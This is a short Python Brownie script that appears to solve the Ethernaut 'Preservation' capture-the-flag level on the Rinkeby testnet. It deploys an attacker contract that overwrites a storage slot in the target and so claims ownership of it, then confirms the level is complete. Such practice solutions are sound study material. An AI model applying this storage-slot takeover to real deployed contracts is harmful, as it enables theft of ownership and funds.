from brownie import accounts, Preservation, PreservationAttacker

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0xa0a0Ca7a038362B45ddC2B9925685C3d6D9F7A1D"
preservation = Preservation.at(instance_address)

# ----------------------------------------------------------
# to beat this level we must claim ownership of the instance
# ----------------------------------------------------------


def level_completed():
    return account.address == preservation.owner()


def exploit():
    # deploy hacker contract
    hacker = PreservationAttacker.deploy(preservation, {"from": account})

    # view the owner
    print(f"The owner of the contract is: {preservation.owner()}")

    # call attack function (sets first storage slot to our hacker's address)
    tx = hacker.attack({"from": account})
    tx.wait(1)

    # check address of first storage slot
    print(
        f"hacker.address is now in the first storage slot: {hacker.address == preservation.timeZone1Library()}"
    )

    # confirm we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
